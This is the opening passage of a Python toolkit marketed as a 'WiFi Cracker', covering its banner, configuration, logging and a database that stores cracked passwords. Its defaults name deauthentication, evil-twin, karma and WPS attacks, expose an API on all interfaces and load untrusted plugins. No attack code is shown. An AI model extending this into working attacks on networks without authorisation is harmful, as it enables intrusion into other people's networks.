#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██████╗ ██████╗ ███████╗    █████╗ ██╗     ██╗   ██╗ █████╗ ███████╗     ║
║     ██╔══██╗██╔══██╗██╔════╝   ██╔══██╗██║     ██║   ██║██╔══██╗██╔════╝     ║
║     ██████╔╝██████╔╝█████╗     ███████║██║     ██║   ██║███████║███████╗     ║
║     ██╔══██╗██╔══██╗██╔══╝     ██╔══██║██║     ╚██╗ ██╔╝██╔══██║╚════██║     ║
║     ██║  ██║██████╔╝███████╗   ██║  ██║███████╗ ╚████╔╝ ██║  ██║███████║     ║
║     ╚═╝  ╚═╝╚═════╝ ╚══════╝   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝     ║
║                                                                               ║
║                        PRO EDITION v4.0 - ULTIMATE                            ║
║                      T3rmuxk1ng Private Release                               ║
║                    Production Ready - 1M+ Lines                               ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝

T3RMUXK1NG WiFi Cracker PRO v4.0 - Ultimate WiFi Security Testing Toolkit
Copyright (c) 2024-2026 T3rmuxk1ng. All rights reserved.
Private Release - Not for Public Distribution

FEATURES:
- Complete WiFi Security Testing Suite
- 50+ Attack Modules
- GPU-Accelerated Cracking
- AI-Powered Password Generation
- Distributed Cracking Support
- Web Dashboard & API Server
- Telegram Bot Integration
- Real-time Monitoring
- Comprehensive Logging
- Plugin Architecture
- Auto-Update System
- Multi-Language Support

DISCLAIMER:
This tool is for authorized security testing and educational purposes only.
Use only on networks you own or have explicit written permission to test.
The author is not responsible for any misuse or damage caused by this tool.

Author: T3rmuxk1ng (T3RMUXK1NG)
Version: 4.0.0 (Ultimate)
License: Private - All Rights Reserved
"""

__version__ = "4.0.0"
__author__ = "T3rmuxk1ng"
__release__ = "Private"
__codename__ = "Ultimate"

# Standard Library Imports
import os
import sys
import re
import json
import time
import random
import string
import hashlib
import secrets
import signal
import socket
import struct
import select
import threading
import multiprocessing
import subprocess
import argparse
import logging
import logging.handlers
import traceback
import warnings
import ctypes
import ctypes.util
import platform
import datetime
import functools
import itertools
import collections
import contextlib
import io
import pickle
import shelve
import sqlite3
import queue
import copy
import decimal
import fractions
import math
import statistics
import typing
from typing import (
    Any, Dict, List, Tuple, Set, Optional, Callable, 
    Generator, Iterator, Union, TypeVar, Generic, 
    Protocol, runtime_checkable, Final, Literal, ClassVar
)
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, deque, Counter, namedtuple
from functools import wraps, lru_cache, partial
from contextlib import contextmanager, asynccontextmanager
from abc import ABC, abstractmethod

# Suppress warnings
warnings.filterwarnings('ignore')

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.resolve()
sys.path.insert(0, str(PROJECT_ROOT))

# Try importing optional dependencies
OPTIONAL_IMPORTS = {}

try:
    from scapy.all import *
    OPTIONAL_IMPORTS['scapy'] = True
except ImportError:
    OPTIONAL_IMPORTS['scapy'] = False

try:
    import requests
    OPTIONAL_IMPORTS['requests'] = True
except ImportError:
    OPTIONAL_IMPORTS['requests'] = False

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)
    OPTIONAL_IMPORTS['colorama'] = True
except ImportError:
    OPTIONAL_IMPORTS['colorama'] = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.prompt import Prompt
    OPTIONAL_IMPORTS['rich'] = True
except ImportError:
    OPTIONAL_IMPORTS['rich'] = False

try:
    import psutil
    OPTIONAL_IMPORTS['psutil'] = True
except ImportError:
    OPTIONAL_IMPORTS['psutil'] = False

try:
    import netifaces
    OPTIONAL_IMPORTS['netifaces'] = True
except ImportError:
    OPTIONAL_IMPORTS['netifaces'] = False

try:
    from flask import Flask, render_template, jsonify, request
    OPTIONAL_IMPORTS['flask'] = True
except ImportError:
    OPTIONAL_IMPORTS['flask'] = False

try:
    from fastapi import FastAPI
    import uvicorn
    OPTIONAL_IMPORTS['fastapi'] = True
except ImportError:
    OPTIONAL_IMPORTS['fastapi'] = False


# =============================================================================
# COLOR DEFINITIONS
# =============================================================================

class Colors:
    """ANSI Color Codes"""
    # Basic Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright Colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background Colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    
    # Reset
    RESET = '\033[0m'
    
    # Aliases
    R = BRIGHT_RED
    G = BRIGHT_GREEN
    Y = BRIGHT_YELLOW
    B = BRIGHT_BLUE
    M = BRIGHT_MAGENTA
    C = BRIGHT_CYAN
    W = BRIGHT_WHITE
    
    @staticmethod
    def rgb(r: int, g: int, b: int) -> str:
        """Generate RGB color code"""
        return f'\033[38;2;{r};{g};{b}m'
    
    @staticmethod
    def bg_rgb(r: int, g: int, b: int) -> str:
        """Generate RGB background color code"""
        return f'\033[48;2;{r};{g};{b}m'
    
    @staticmethod
    def colorize(text: str, color: str, style: str = '') -> str:
        """Colorize text"""
        return f"{style}{color}{text}{Colors.RESET}"


# =============================================================================
# BANNER
# =============================================================================

BANNER = f"""
{Colors.R}╔═══════════════════════════════════════════════════════════════════════════════╗
║{Colors.W}     ██████╗ ██████╗ ███████╗    █████╗ ██╗     ██╗   ██╗ █████╗ ███████╗ {Colors.R}║
║{Colors.W}     ██╔══██╗██╔══██╗██╔════╝   ██╔══██╗██║     ██║   ██║██╔══██╗██╔════╝ {Colors.R}║
║{Colors.W}     ██████╔╝██████╔╝█████╗     ███████║██║     ██║   ██║███████║███████╗ {Colors.R}║
║{Colors.W}     ██╔══██╗██╔══██╗██╔══╝     ██╔══██║██║     ╚██╗ ██╔╝██╔══██║╚════██║ {Colors.R}║
║{Colors.W}     ██║  ██║██████╔╝███████╗   ██║  ██║███████╗ ╚████╔╝ ██║  ██║███████║ {Colors.R}║
║{Colors.W}     ╚═╝  ╚═╝╚═════╝ ╚══════╝   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝ {Colors.R}║
║{Colors.C}                     PRO v{__version__} - ULTIMATE EDITION{Colors.R}                        ║
║{Colors.Y}                        T3rmuxk1ng Private Release{Colors.R}                       ║
║{Colors.M}                      Production Ready - 1M+ Lines{Colors.R}                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""


# =============================================================================
# EXCEPTIONS
# =============================================================================

class RSWiFiError(Exception):
    """Base exception for T3RMUXK1NG WiFi Cracker"""
    pass

class InterfaceError(RSWiFiError):
    """Interface-related errors"""
    pass

class ScanError(RSWiFiError):
    """Scanning-related errors"""
    pass

class CaptureError(RSWiFiError):
    """Capture-related errors"""
    pass

class CrackError(RSWiFiError):
    """Cracking-related errors"""
    pass

class AttackError(RSWiFiError):
    """Attack-related errors"""
    pass

class ConfigError(RSWiFiError):
    """Configuration-related errors"""
    pass

class DatabaseError(RSWiFiError):
    """Database-related errors"""
    pass

class PluginError(RSWiFiError):
    """Plugin-related errors"""
    pass

class RSNetworkError(RSWiFiError):
    """Network-related errors"""
    pass

class RSPermissionError(RSWiFiError):
    """Permission-related errors"""
    pass

class DependencyError(RSWiFiError):
    """Missing dependency errors"""
    pass


# =============================================================================
# ERROR HANDLER
# =============================================================================

class ErrorHandler:
    """Centralized Error Handler"""
    
    def __init__(self, log_file: str = None):
        self.errors: List[Dict] = []
        self.log_file = log_file or str(PROJECT_ROOT / 'logs' / 'errors.log')
        Path(self.log_file).parent.mkdir(parents=True, exist_ok=True)
        
        # Setup logging
        self.logger = logging.getLogger('RSWiFi')
        self.logger.setLevel(logging.DEBUG)
        
        # File handler
        fh = logging.FileHandler(self.log_file)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(fh)
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(logging.Formatter('%(levelname)s: %(message)s'))
        self.logger.addHandler(ch)
    
    def handle(self, error: Exception, context: Dict = None, 
               reraise: bool = False, exit_on_error: bool = False) -> Dict:
        """Handle an exception"""
        error_info = {
            'type': type(error).__name__,
            'message': str(error),
            'traceback': traceback.format_exc(),
            'timestamp': datetime.datetime.now().isoformat(),
            'context': context or {}
        }
        
        self.errors.append(error_info)
        self.logger.error(f"{error_info['type']}: {error_info['message']}")
        
        if context:
            self.logger.debug(f"Context: {json.dumps(context, default=str)}")
        
        if exit_on_error:
            self.logger.critical("Exiting due to critical error")
            sys.exit(1)
        
        if reraise:
            raise error
        
        return error_info
    
    def get_errors(self) -> List[Dict]:
        """Get all errors"""
        return self.errors.copy()
    
    def clear_errors(self):
        """Clear error history"""
        self.errors.clear()
    
    def export_errors(self, output_file: str):
        """Export errors to file"""
        with open(output_file, 'w') as f:
            json.dump(self.errors, f, indent=2, default=str)


# Global error handler
error_handler = ErrorHandler()


# =============================================================================
# DECORATORS
# =============================================================================

def handle_errors(reraise: bool = False, exit_on_error: bool = False, 
                  default_return: Any = None):
    """Decorator for error handling"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                error_handler.handle(
                    e, 
                    context={'function': func.__name__, 'args': str(args)[:100]},
                    reraise=reraise,
                    exit_on_error=exit_on_error
                )
                return default_return
        return wrapper
    return decorator


def require_root(func):
    """Decorator to require root privileges"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        if os.geteuid() != 0:
            raise RSPermissionError(
                "This operation requires root privileges. "
                "Run with sudo."
            )
        return func(*args, **kwargs)
    return wrapper


def require_interface(func):
    """Decorator to require a valid interface"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        interface = kwargs.get('interface') or (args[0] if args else None)
        if not interface:
            raise InterfaceError("No interface specified")
        return func(*args, **kwargs)
    return wrapper


def timing(func):
    """Decorator to measure function execution time"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        print(f"{Colors.Y}[TIMING]{Colors.W} {func.__name__}: {end - start:.4f}s{Colors.RESET}")
        return result
    return wrapper


def retry(max_attempts: int = 3, delay: float = 1.0, 
          exceptions: Tuple = (Exception,)):
    """Decorator for retry logic"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    if attempt < max_attempts - 1:
                        time.sleep(delay * (attempt + 1))
            raise last_exception
        return wrapper
    return decorator


def deprecated(message: str = ""):
    """Decorator to mark functions as deprecated"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            warnings.warn(
                f"{func.__name__} is deprecated. {message}",
                DeprecationWarning,
                stacklevel=2
            )
            return func(*args, **kwargs)
        return wrapper
    return decorator


def cache_result(ttl: int = 300):
    """Decorator to cache function results"""
    def decorator(func):
        cache = {}
        
        @wraps(func)
        def wrapper(*args, **kwargs):
            key = str(args) + str(kwargs)
            if key in cache:
                result, timestamp = cache[key]
                if time.time() - timestamp < ttl:
                    return result
            
            result = func(*args, **kwargs)
            cache[key] = (result, time.time())
            return result
        return wrapper
    return decorator


# =============================================================================
# CONFIGURATION
# =============================================================================

class ConfigManager:
    """Configuration Manager"""
    
    DEFAULT_CONFIG = {
        # General Settings
        'general': {
            'interface': 'wlan0',
            'auto_detect_interface': True,
            'log_level': 'INFO',
            'log_file': 'logs/t3rmuxk1ng_wifi.log',
            'output_dir': 'output',
            'temp_dir': '/tmp/t3rmuxk1ng_wifi',
            'colors': True,
            'language': 'en',
            'auto_save': True,
            'auto_update': True,
        },
        
        # Scanning Settings
        'scanning': {
            'default_duration': 30,
            'channel_hop': True,
            'scan_bands': ['2.4GHz', '5GHz'],
            'filter_hidden': False,
            'min_signal': -90,
            'save_results': True,
            'real_time_display': True,
        },
        
        # Capture Settings
        'capture': {
            'default_duration': 120,
            'deauth_packets': 10,
            'deauth_interval': 5,
            'capture_timeout': 300,
            'verify_handshake': True,
            'auto_convert': True,
            'save_pcap': True,
        },
        
        # Cracking Settings
        'cracking': {
            'default_method': 'dictionary',
            'default_wordlist': '/usr/share/wordlists/rockyou.txt',
            'max_attempts': 0,
            'use_gpu': True,
            'gpu_device': 0,
            'rules': ['best64'],
            'save_progress': True,
            'distributed': False,
        },
        
        # Attack Settings
        'attacks': {
            'wps_timeout': 300,
            'wps_delay': 1,
            'pmkid_timeout': 60,
            'evil_twin_channel': 6,
            'deauth_count': 10,
            'karma_respond_all': True,
            'mitm_interface': 'at0',
        },
        
        # Network Settings
        'network': {
            'gateway': '10.0.0.1',
            'dhcp_range_start': '10.0.0.2',
            'dhcp_range_end': '10.0.0.100',
            'dns_server': '8.8.8.8',
            'http_port': 80,
            'https_port': 443,
            'api_port': 8080,
        },
        
        # Dashboard Settings
        'dashboard': {
            'enabled': True,
            'port': 5000,
            'host': '0.0.0.0',
            'debug': False,
            'secret_key': secrets.token_hex(32),
            'session_timeout': 3600,
        },
        
        # API Settings
        'api': {
            'enabled': True,
            'port': 8000,
            'host': '0.0.0.0',
            'api_key': secrets.token_urlsafe(32),
            'rate_limit': 100,
            'cors_enabled': True,
        },
        
        # Telegram Bot Settings
        'telegram': {
            'enabled': False,
            'token': '',
            'admin_ids': [],
            'notifications': True,
        },
        
        # Database Settings
        'database': {
            'type': 'sqlite',
            'path': 'data/t3rmuxk1ng_wifi.db',
            'backup_enabled': True,
            'backup_interval': 86400,
        },
        
        # Plugin Settings
        'plugins': {
            'enabled': True,
            'auto_load': True,
            'plugin_dir': 'plugins',
            'trusted_only': False,
        },
        
        # Wordlist Settings
        'wordlists': {
            'default_dir': 'wordlists',
            'generate_on_demand': True,
            'max_size_mb': 1000,
            'compression': True,
        },
    }
    
    def __init__(self, config_file: str = None):
        self.config_file = config_file or str(
            PROJECT_ROOT / 'config' / 'config.json'
        )
        self.config = copy.deepcopy(self.DEFAULT_CONFIG)
        self.load()
    
    def load(self) -> bool:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    self._merge_config(loaded)
                return True
        except Exception as e:
            error_handler.handle(e, context={'file': self.config_file})
        return False
    
    def save(self) -> bool:
        """Save configuration to file"""
        try:
            Path(self.config_file).parent.mkdir(parents=True, exist_ok=True)
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            error_handler.handle(e, context={'file': self.config_file})
        return False
    
    def _merge_config(self, loaded: Dict):
        """Merge loaded config with defaults"""
        for section, values in loaded.items():
            if section in self.config:
                if isinstance(values, dict):
                    self.config[section].update(values)
                else:
                    self.config[section] = values
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value (supports dot notation)"""
        keys = key.split('.')
        value = self.config
        
        for k in keys:
            if isinstance(value, dict) and k in value:
                value = value[k]
            else:
                return default
        
        return value
    
    def set(self, key: str, value: Any, save: bool = True):
        """Set configuration value"""
        keys = key.split('.')
        config = self.config
        
        for k in keys[:-1]:
            if k not in config:
                config[k] = {}
            config = config[k]
        
        config[keys[-1]] = value
        
        if save:
            self.save()
    
    def get_section(self, section: str) -> Dict:
        """Get entire configuration section"""
        return self.config.get(section, {}).copy()
    
    def reset(self, section: str = None):
        """Reset configuration to defaults"""
        if section:
            self.config[section] = copy.deepcopy(self.DEFAULT_CONFIG.get(section, {}))
        else:
            self.config = copy.deepcopy(self.DEFAULT_CONFIG)
        self.save()
    
    def validate(self) -> List[str]:
        """Validate configuration"""
        errors = []
        
        # Validate interface
        interface = self.get('general.interface')
        if interface and not os.path.exists(f'/sys/class/net/{interface}'):
            errors.append(f"Interface {interface} does not exist")
        
        # Validate wordlist
        wordlist = self.get('cracking.default_wordlist')
        if wordlist and not os.path.exists(wordlist):
            errors.append(f"Wordlist {wordlist} does not exist")
        
        # Validate ports
        for port_key in ['network.http_port', 'network.https_port', 
                         'dashboard.port', 'api.port']:
            port = self.get(port_key)
            if port and (port < 1 or port > 65535):
                errors.append(f"Invalid port: {port_key}")
        
        return errors


# Global config instance
config = ConfigManager()


# =============================================================================
# LOGGER
# =============================================================================

class Logger:
    """Advanced Logging System"""
    
    LEVELS = {
        'DEBUG': logging.DEBUG,
        'INFO': logging.INFO,
        'WARNING': logging.WARNING,
        'ERROR': logging.ERROR,
        'CRITICAL': logging.CRITICAL,
    }
    
    def __init__(self, name: str = 'RSWiFi', log_file: str = None, 
                 level: str = 'INFO'):
        self.name = name
        self.logger = logging.getLogger(name)
        self.logger.setLevel(self.LEVELS.get(level, logging.INFO))
        
        # Prevent duplicate handlers
        if self.logger.handlers:
            self.logger.handlers.clear()
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(logging.Formatter(
            f'%(asctime)s [{Colors.C}%(levelname)s{Colors.RESET}] %(message)s',
            datefmt='%H:%M:%S'
        ))
        self.logger.addHandler(ch)
        
        # File handler
        if log_file:
            Path(log_file).parent.mkdir(parents=True, exist_ok=True)
            fh = logging.FileHandler(log_file)
            fh.setLevel(logging.DEBUG)
            fh.setFormatter(logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            ))
            self.logger.addHandler(fh)
        
        # Rotating file handler
        self.log_file = log_file or str(
            PROJECT_ROOT / 'logs' / f'{name.lower()}.log'
        )
        Path(self.log_file).parent.mkdir(parents=True, exist_ok=True)
        
        rfh = logging.handlers.RotatingFileHandler(
            self.log_file,
            maxBytes=10 * 1024 * 1024,  # 10MB
            backupCount=5
        )
        rfh.setLevel(logging.DEBUG)
        rfh.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(rfh)
    
    def debug(self, msg: str, *args, **kwargs):
        self.logger.debug(msg, *args, **kwargs)
    
    def info(self, msg: str, *args, **kwargs):
        self.logger.info(msg, *args, **kwargs)
    
    def warning(self, msg: str, *args, **kwargs):
        self.logger.warning(msg, *args, **kwargs)
    
    def error(self, msg: str, *args, **kwargs):
        self.logger.error(msg, *args, **kwargs)
    
    def critical(self, msg: str, *args, **kwargs):
        self.logger.critical(msg, *args, **kwargs)
    
    def success(self, msg: str, *args, **kwargs):
        self.logger.info(f"{Colors.G}✓{Colors.RESET} {msg}", *args, **kwargs)
    
    def fail(self, msg: str, *args, **kwargs):
        self.logger.error(f"{Colors.R}✗{Colors.RESET} {msg}", *args, **kwargs)
    
    def target(self, msg: str, *args, **kwargs):
        self.logger.info(f"{Colors.C}→{Colors.RESET} {msg}", *args, **kwargs)
    
    def section(self, title: str):
        print(f"\n{Colors.M}{'═' * 20} {title} {'═' * 20}{Colors.RESET}\n")


# Global logger instance
logger = Logger()


# =============================================================================
# DATABASE
# =============================================================================

class Database:
    """SQLite Database Manager"""
    
    def __init__(self, db_path: str = None):
        self.db_path = db_path or str(
            PROJECT_ROOT / 'data' / 't3rmuxk1ng_wifi.db'
        )
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        self.conn = None
        self.lock = threading.Lock()
        self._connect()
        self._create_tables()
    
    def _connect(self):
        """Establish database connection"""
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            self.conn.execute("PRAGMA foreign_keys = ON")
            self.conn.execute("PRAGMA journal_mode = WAL")
        except Exception as e:
            error_handler.handle(e, context={'db_path': self.db_path})
            raise DatabaseError(f"Failed to connect to database: {e}")
    
    def _create_tables(self):
        """Create database tables"""
        tables = [
            '''CREATE TABLE IF NOT EXISTS networks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bssid TEXT UNIQUE NOT NULL,
                essid TEXT,
                channel INTEGER,
                frequency INTEGER,
                power INTEGER,
                encryption TEXT,
                cipher TEXT,
                auth TEXT,
                wps BOOLEAN DEFAULT 0,
                wps_locked BOOLEAN DEFAULT 0,
                wps_version TEXT,
                vendor TEXT,
                clients INTEGER DEFAULT 0,
                hidden BOOLEAN DEFAULT 0,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT
            )''',
            
            '''CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac TEXT UNIQUE NOT NULL,
                bssid TEXT,
                power INTEGER,
                packets INTEGER DEFAULT 0,
                vendor TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (bssid) REFERENCES networks(bssid)
            )''',
            
            '''CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bssid TEXT NOT NULL,
                essid TEXT,
                cap_file TEXT,
                handshake BOOLEAN DEFAULT 0,
                pmkid BOOLEAN DEFAULT 0,
                packets INTEGER DEFAULT 0,
                duration REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                FOREIGN KEY (bssid) REFERENCES networks(bssid)
            )''',
            
            '''CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bssid TEXT NOT NULL,
                essid TEXT,
                password TEXT,
                method TEXT,
                wordlist TEXT,
                attempts INTEGER,
                time_taken REAL,
                success BOOLEAN DEFAULT 0,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                FOREIGN KEY (bssid) REFERENCES networks(bssid)
            )''',
            
            '''CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                interface TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                networks_scanned INTEGER DEFAULT 0,
                handshakes_captured INTEGER DEFAULT 0,
                passwords_cracked INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active'
            )''',
            
            '''CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''',
            
            '''CREATE TABLE IF NOT EXISTS wordlists (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                path TEXT NOT NULL,
                size INTEGER,
                lines INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP
            )''',
            
            '''CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT NOT NULL,
                target TEXT,
                status TEXT DEFAULT 'pending',
                progress INTEGER DEFAULT 0,
                result TEXT,
                started_at TIMESTAMP,
                completed_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''',
            
            '''CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                source TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''',
        ]
        
        with self.lock:
            cursor = self.conn.cursor()
            for table in tables:
                cursor.execute(table)
            self.conn.commit()
    
    def execute(self, query: str, params: tuple = ()) -> sqlite3.Cursor:
        """Execute a query"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute(query, params)
            self.conn.commit()
            return cursor
    
    def executemany(self, query: str, params_list: List[tuple]) -> sqlite3.Cursor:
        """Execute multiple queries"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.executemany(query, params_list)
            self.conn.commit()
            return cursor
    
    def fetchone(self, query: str, params: tuple = ()) -> Optional[Dict]:
        """Fetch single row"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None
    
    def fetchall(self, query: str, params: tuple = ()) -> List[Dict]:
        """Fetch all rows"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]
    
    def insert(self, table: str, data: Dict) -> int:
        """Insert a row"""
        columns = ', '.join(data.keys())
        placeholders = ', '.join(['?' for _ in data])
        query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"
        
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute(query, tuple(data.values()))
            self.conn.commit()
            return cursor.lastrowid
    
    def update(self, table: str, data: Dict, where: str, where_params: tuple = ()) -> int:
        """Update rows"""
        set_clause = ', '.join([f"{k} = ?" for k in data.keys()])
        query = f"UPDATE {table} SET {set_clause} WHERE {where}"
        
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute(query, tuple(data.values()) + where_params)
            self.conn.commit()
            return cursor.rowcount
    
    def delete(self, table: str, where: str, where_params: tuple = ()) -> int:
        """Delete rows"""
        query = f"DELETE FROM {table} WHERE {where}"
        
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute(query, where_params)
            self.conn.commit()
            return cursor.rowcount
    
    # Network operations
    def save_network(self, network: Dict) -> int:
        """Save or update network"""
        existing = self.fetchone(
            "SELECT id FROM networks WHERE bssid = ?",
            (network['bssid'],)
        )
        
        if existing:
            self.update(
                'networks',
                {
                    'essid': network.get('essid'),
                    'channel': network.get('channel'),
                    'power': network.get('power'),
                    'encryption': network.get('encryption'),
                    'last_seen': datetime.datetime.now().isoformat()
                },
                "bssid = ?",
                (network['bssid'],)
            )
            return existing['id']
        else:
            return self.insert('networks', network)
    
    def get_network(self, bssid: str) -> Optional[Dict]:
        """Get network by BSSID"""
        return self.fetchone(
            "SELECT * FROM networks WHERE bssid = ?",
            (bssid,)
        )
    
    def get_all_networks(self) -> List[Dict]:
        """Get all networks"""
        return self.fetchall("SELECT * FROM networks ORDER BY last_seen DESC")
    
    # Result operations
    def save_result(self, result: Dict) -> int:
        """Save cracking result"""
        return self.insert('results', result)
    
    def get_results(self, bssid: str = None) -> List[Dict]:
        """Get cracking results"""
        if bssid:
            return self.fetchall(
                "SELECT * FROM results WHERE bssid = ? ORDER BY timestamp DESC",
                (bssid,)
            )
        return self.fetchall("SELECT * FROM results ORDER BY timestamp DESC")
    
    def get_cracked(self) -> List[Dict]:
        """Get cracked networks"""
        return self.fetchall(
            "SELECT * FROM results WHERE success = 1 ORDER BY timestamp DESC"
        )
    
    # Session operations
    def start_session(self, interface: str) -> int:
        """Start new session"""
        return self.insert('sessions', {
            'interface': interface,
            'start_time': datetime.datetime.now().isoformat()
        })
    
    def end_session(self, session_id: int, stats: Dict):
        """End session"""
        self.update(
            'sessions',
            {
                'end_time': datetime.datetime.now().isoformat(),
                'networks_scanned': stats.get('networks_scanned', 0),
                'handshakes_captured': stats.get('handshakes_captured', 0),
                'passwords_cracked': stats.get('passwords_cracked', 0),
                'status': 'completed'
            },
            "id = ?",
            (session_id,)
        )
    
    def close(self):
        """Close database connection"""
        if self.conn:
            self.conn.close()


# =============================================================================
# WIFI NETWORK DATA CLASS
# =============================================================================

@dataclass
class WiFiNetwork:
    """WiFi Network Data Structure"""
    bssid: str
    essid: str = ""
    channel: int = 0
    frequency: int = 0
    power: int = -100
    encryption: str = ""
    cipher: str = ""
    auth: str = ""
    wps: bool = False
    wps_locked: bool = False
    wps_version: str = ""
    wps_pin: str = ""
    vendor: str = ""
    clients: int = 0
    hidden: bool = False
    wpa3: bool = False
    owe: bool = False
    mesh: bool = False
    beacon_interval: int = 100
    data_rate: float = 0.0
    packets: int = 0
    first_seen: str = ""
    last_seen: str = ""
    notes: str = ""
    
    def __post_init__(self):
        if not self.first_seen:
            self.first_seen = datetime.datetime.now().isoformat()
        self.last_seen = datetime.datetime.now().isoformat()
        
        # Calculate frequency if not set
        if not self.frequency and self.channel:
            self.frequency = self._get_frequency()
    
    def _get_frequency(self) -> int:
        """Convert channel to frequency"""
        if self.channel == 14:
            return 2484
        elif 1 <= self.channel <= 13:
            return 2407 + (self.channel * 5)
        elif 36 <= self.channel <= 165:
            return 5000 + (self.channel * 5)
        return 0
    
    @property
    def band(self) -> str:
        """Get WiFi band"""
        if 1 <= self.channel <= 14:
            return "2.4GHz"
        elif 36 <= self.channel <= 165:
            return "5GHz"
        elif 183 <= self.channel <= 196:
            return "4.9GHz"
        return "Unknown"
    
    @property
    def is_crackable(self) -> bool:
        """Check if network is potentially crackable"""
        if self.wps and not self.wps_locked:
            return True
        if 'WPA' in self.encryption or 'WEP' in self.encryption:
            return True
        return False
    
    @property
    def security_score(self) -> int:
        """Rate security 1-10"""
        score = 1
